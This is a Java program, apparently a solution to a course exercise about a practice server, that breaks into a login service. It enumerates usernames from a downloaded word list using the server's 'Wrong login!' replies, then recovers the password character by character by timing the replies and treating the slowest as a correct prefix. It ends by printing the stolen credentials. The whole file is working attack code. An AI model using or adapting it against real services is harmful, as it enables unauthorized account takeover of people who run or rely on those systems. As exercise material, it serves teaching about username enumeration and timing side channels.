package hacker;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;

public class Main {

    private static final String LOGINS_URL =
            "https://cogniterra.org/media/attachments/lesson/27535/logins.txt";

    // Passwords are built from these characters (a-zA-Z0-9).
    private static final char[] CHARS =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".toCharArray();

    // A correct password prefix makes the server stall ~100ms (it "catches an exception").
    // Anything well above localhost round-trip noise but below 100ms works as the cut-off.
    private static final long SLOW_MS = 50;

    public static void main(String[] args) throws Exception {
        String host = args[0];
        int port = Integer.parseInt(args[1]);

        List<String> logins = loadLogins();

        try (Socket socket = new Socket(InetAddress.getByName(host), port);
             DataInputStream in = new DataInputStream(socket.getInputStream());
             DataOutputStream out = new DataOutputStream(socket.getOutputStream())) {

            // 1. Find the login. The server checks the login first, so any non-empty password
            //    works; a reply other than "Wrong login!" means this login is the right one.
            String login = null;
            for (String candidate : logins) {
                Reply r = send(out, in, candidate, "a");
                if (r.text.contains("Connection success!")) {   // password happened to be "a"
                    printResult(candidate, "a");
                    return;
                }
                if (!r.text.contains("Wrong login!")) {
                    login = candidate;
                    break;
                }
            }
            if (login == null) {
                return; // no login in the dictionary matched
            }

            // 2. Recover the password character by character using the timing leak: a correct
            //    prefix triggers the server's exception handler and comes back noticeably slower.
            StringBuilder password = new StringBuilder();
            while (true) {
                char best = 0;
                long bestMs = -1;
                for (char c : CHARS) {
                    Reply r = send(out, in, login, password.toString() + c);
                    if (r.text.contains("Connection success!")) {
                        password.append(c);
                        printResult(login, password.toString());
                        return;
                    }
                    // A real "Exception" message (alternative server variant) is a sure hit.
                    if (r.text.contains("Exception")) {
                        best = c;
                        bestMs = Long.MAX_VALUE;
                        break;
                    }
                    if (r.ms > bestMs) {
                        bestMs = r.ms;
                        best = c;
                    }
                }
                if (best == 0 || bestMs < SLOW_MS) {
                    return; // no character extended the prefix (should not happen)
                }
                password.append(best);   // slowest reply = next correct character
            }
        }
    }

    /** Sends one {login, password} request as JSON; returns the reply text and its round-trip time. */
    private static Reply send(DataOutputStream out, DataInputStream in, String login, String password)
            throws IOException {
        long start = System.nanoTime();
        out.writeUTF("{\"login\": \"" + escape(login) + "\", \"password\": \"" + escape(password) + "\"}");
        out.flush();
        String text = in.readUTF();
        long ms = (System.nanoTime() - start) / 1_000_000;
        return new Reply(text, ms);
    }

    private static void printResult(String login, String password) {
        System.out.println("{\n    \"login\": \"" + escape(login)
                + "\",\n    \"password\": \"" + escape(password) + "\"\n}");
    }

    private static String escape(String s) {
        return s.replace("\\", "\\\\").replace("\"", "\\\"");
    }

    private static List<String> loadLogins() throws IOException {
        List<String> logins = new ArrayList<>();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(
                URI.create(LOGINS_URL).toURL().openStream(), StandardCharsets.UTF_8))) {
            String line;
            while ((line = reader.readLine()) != null) {
                line = line.strip();
                if (!line.isEmpty()) {
                    logins.add(line);
                }
            }
        }
        return logins;
    }

    /** A server reply together with how long it took to arrive. */
    private static final class Reply {
        final String text;
        final long ms;

        Reply(String text, long ms) {
            this.text = text;
            this.ms = ms;
        }
    }
}
